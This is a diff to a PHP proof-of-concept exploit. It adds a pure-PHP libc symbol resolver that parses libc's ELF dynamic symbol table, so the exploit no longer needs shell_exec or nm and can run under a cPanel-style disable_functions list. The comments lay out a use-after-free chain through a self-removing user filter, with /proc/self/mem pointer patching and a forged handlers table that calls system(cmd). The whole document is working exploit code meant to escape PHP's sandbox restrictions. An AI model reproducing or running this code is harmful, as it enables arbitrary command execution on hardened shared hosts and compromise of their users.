@@ -1,14 +1,91 @@
 <?php
 /**
- * #7 no-FFI v7 — FULL STOCK. String reclaim (bin 96) + /proc-write of the P1 slot.
- * Verified deref chain (stock 8.4/8.5/8.6):
- *   rsi = *(CHUNK+8)                     <- /proc-patched to P1
- *   rdi = *(P1+0x10)                     (scope, not fatally deref'd)
- *   zend_update_property_null(rdi, P1, "stream", 5)
- *   OBJ  = *(P1+0)                       [Z_OBJ_P]
- *   fn   = *(*(OBJ+0x18) + 0x30)         -> write_property(OBJ, "stream", NULL)
- *   system: cmd = C-string at OBJ+0 ; abort: dies in fn.
- * P1/OBJ/table live in the beaconed big string; all pointers /proc-patched.
+ * Pure-PHP libc symbol resolver: parses the ELF dynamic symbol table of the
+ * loaded libc and returns the runtime address of a symbol. No shell, no nm,
+ * no exec family. Works under disable_functions.
+ */
+function elf_resolve_symbol(string $sym): int {
+    // locate libc path + load base from maps
+    $libc_path = null; $base = null;
+    foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $l) {
+        if (strpos($l, 'libc.so.6') === false) continue;
+        if (preg_match('/^([0-9a-f]+)-[0-9a-f]+\s+(\S+)\s+([0-9a-f]+)\s+\S+\s+\S+\s+(\S+)/', $l, $m)) {
+            if ($m[3] === '00000000') { $base = hexdec($m[1]); $libc_path = $m[4]; break; }
+        }
+    }
+    if (!$libc_path || $base === null) return 0;
+
+    $f = fopen($libc_path, 'rb');
+    if (!$f) return 0;
+
+    $hdr = fread($f, 64);
+    if (strlen($hdr) < 64 || substr($hdr, 0, 4) !== "\x7fELF") { fclose($f); return 0; }
+    $phoff = unpack('P', substr($hdr, 0x20, 8))[1];
+    $phentsize = unpack('v', substr($hdr, 0x36, 2))[1];
+    $phnum = unpack('v', substr($hdr, 0x38, 2))[1];
+
+    // find PT_DYNAMIC
+    $dyn_off = 0; $dyn_sz = 0;
+    fseek($f, $phoff);
+    for ($i = 0; $i < $phnum; $i++) {
+        $ph = fread($f, $phentsize);
+        if (strlen($ph) < $phentsize) break;
+        $ptype = unpack('V', substr($ph, 0, 4))[1];
+        if ($ptype === 2) { // PT_DYNAMIC
+            $dyn_off = unpack('P', substr($ph, 0x08, 8))[1];
+            $dyn_sz = unpack('P', substr($ph, 0x20, 8))[1];
+            break;
+        }
+    }
+    if (!$dyn_off) { fclose($f); return 0; }
+
+    // parse dynamic table
+    $strtab = 0; $symtab = 0; $strsz = 0; $syment = 24;
+    fseek($f, $dyn_off);
+    $dyn = fread($f, $dyn_sz);
+    for ($o = 0; $o + 16 <= strlen($dyn); $o += 16) {
+        $tag = unpack('P', substr($dyn, $o, 8))[1];
+        $val = unpack('P', substr($dyn, $o + 8, 8))[1];
+        if ($tag === 0) break;
+        if ($tag === 5) $strtab = $val;
+        if ($tag === 6) $symtab = $val;
+        if ($tag === 10) $strsz = $val;
+        if ($tag === 11) $syment = max(24, $val);
+    }
+    if (!$strtab || !$symtab) { fclose($f); return 0; }
+
+    // walk symbols from symtab until strtab; check names
+    $count = intdiv($strtab - $symtab, $syment);
+    if ($count <= 0 || $count > 200000) $count = 20000;
+    fseek($f, $symtab);
+    $buf = fread($f, $count * $syment);
+    for ($i = 0; $i < $count; $i++) {
+        $e = substr($buf, $i * $syment, $syment);
+        $st_name = unpack('V', substr($e, 0, 4))[1];
+        $st_value = unpack('P', substr($e, 0x08, 8))[1];
+        if (!$st_name || !$st_value) continue;
+        fseek($f, $strtab + $st_name);
+        $name = '';
+        while (true) {
+            $c = fread($f, 1);
+            if ($c === '' || $c === "\x00" || strlen($name) > 64) break;
+            $name .= $c;
+        }
+        if ($name === $sym) { fclose($f); return $base + $st_value; }
+    }
+    fclose($f);
+    return 0;
+}
+
+/**
+ * #7 hardened variant (v8): runs under disable_functions (full cPanel-style list).
+ * libc system/abort resolved by pure-PHP ELF .dynsym parsing (elf_resolve_symbol)
+ * - no shell_exec, no nm, no exec family anywhere in this PoC.
+ * Chain (stock 8.4/8.5/8.6): user-filter self-remove UAF -> post-callback
+ * zend_update_property_null reads the freed chunk's abstract slot as a direct
+ * zend_object* -> full-bin string reclaim -> /proc/self/mem patches abstract
+ * = obj-host (kept string: cmd@data+0, handlers ptr@data+0x18) -> handlers
+ * table in beaconed big string, write_property = fn -> system(cmd) / abort.
  */
 echo "PHP=".PHP_VERSION." SAPI=".PHP_SAPI."\n";
 try { FFI::cdef('void abort(void);'); echo "FFI_AVAILABLE (unexpected)\n"; }
@@ -30,9 +107,7 @@ foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $l) {
     }
 }
 $sym = ($TARGET === 'abort') ? 'abort' : 'system';
-$awk = 'nm -D /lib/x86_64-linux-gnu/libc.so.6 2>/dev/null | awk \'$NF ~ /^' . $sym . '(@|$)/ {print $1; exit}\'';
-$off = trim((string) shell_exec($awk));
-$fn = ($libc_base && $off) ? $libc_base + hexdec($off) : 0;
+$fn = elf_resolve_symbol($sym);
 if (!$php_base || !$fn) { fwrite(STDERR, "NO_BASES\n"); exit(2); }
 echo sprintf("php=0x%x fn(%s)=0x%x\n", $php_base, $sym, $fn);
 fflush(STDOUT);
